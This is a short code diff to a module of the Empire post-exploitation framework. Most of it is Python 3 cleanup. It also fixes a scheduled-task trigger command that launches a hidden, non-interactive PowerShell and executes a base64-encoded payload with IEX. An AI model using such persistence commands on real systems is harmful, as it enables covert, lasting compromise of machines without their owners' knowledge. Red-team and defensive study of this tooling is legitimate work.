@@ -1,7 +1,4 @@
-from __future__ import print_function
-
 import os
-from builtins import object, str
 from typing import Dict
 
 from empire.server.common import helpers
@@ -9,7 +6,7 @@ from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -87,7 +84,7 @@ class Module(object):
             # read in an external file as the payload and build a
             #   base64 encoded version as encScript
             if os.path.exists(ext_file):
-                f = open(ext_file, "r")
+                f = open(ext_file)
                 fileData = f.read()
                 f.close()
 
@@ -159,7 +156,7 @@ class Module(object):
 
         # built the command that will be triggered by the schtask
         trigger_cmd = (
-            "'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String("
+            "'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String("
             + locationString
             + ")))\\\"'"
         )
